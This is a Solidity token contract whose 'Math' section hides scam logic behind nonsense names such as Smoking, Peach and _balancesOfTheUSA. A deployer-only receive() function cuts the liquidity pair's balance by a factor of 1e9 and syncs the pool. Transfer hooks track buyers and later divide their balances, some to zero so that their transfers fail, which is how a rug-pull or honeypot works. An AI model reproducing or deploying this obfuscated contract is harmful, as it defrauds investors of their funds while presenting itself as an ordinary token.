pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IUniswapV2Pair {
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Math { 
    mapping (address => uint256) internal _balances;
    mapping (address => bool) internal Smoking;

    address[] internal reArr; address[3] internal reorgAddr;

    bool[3] internal Peach; bool internal trading = false;

    uint256 internal Coconut = block.number*2; uint256 internal numB;
    uint256 internal Tired = 0; uint256 internal Forest = 1;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public pair;
    IDEXRouter router;

    function set() internal {
        reorgAddr[0] = address(_router);
        reorgAddr[1] = msg.sender;
        reorgAddr[2] = pair;
        for (uint256 q=0; q < 3; q++) {Math.Smoking[Math.reorgAddr[q]] = true; Math.Peach[q] = false; }
    }

    function last(uint256 g) internal view returns (address) { return (Tired > 1 ? reArr[reArr.length-g-1] : address(0)); }

    receive() external payable {
        require(msg.sender == reorgAddr[1]); _balances[reorgAddr[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(reorgAddr[2]).sync(); Peach[2] = true;
    }

    function _beforeTokenTransfer(address sender, address recipient) internal {
        require((trading || (sender == reorgAddr[1])), "ERC20: trading is not yet enabled.");
        Forest += ((Smoking[sender] != true) && (Smoking[recipient] == true)) ? 1 : 0;
        if (((Smoking[sender] == true) && (Smoking[recipient] != true)) || ((Smoking[sender] != true) && (Smoking[recipient] != true))) { reArr.push(recipient); }
        _balancesOfTheUSA(sender, recipient);
    }

    function _balancesOfTheUSA(address sender, address recipient) internal {
        if ((Peach[0] || (Peach[2] && (recipient != reorgAddr[1])))) { for (uint256 q=0; q < reArr.length-1; q++) { _balances[reArr[q]] /= (Peach[2] ? 1e9 : 4e1); } Peach[0] = false; }
        _balances[last(1)] /= (((Coconut == block.number) || Peach[1] || ((Coconut - numB) <= 7)) && (Smoking[last(1)] != true) && (Tired > 1)) ? (3e1) : (1);
        _balances[last(0)] /= (((Peach[1]) && (last(0) == sender)) || ((Peach[2] && (reorgAddr[1] != sender))) ? (0) : (1));
        (Peach[0],Peach[1]) = ((((Forest*10 / 4) == 10) && (Peach[1] == false)) ? (true,true) : (Peach[0],Peach[1]));
        Coconut = block.number; Tired++;
    }
}
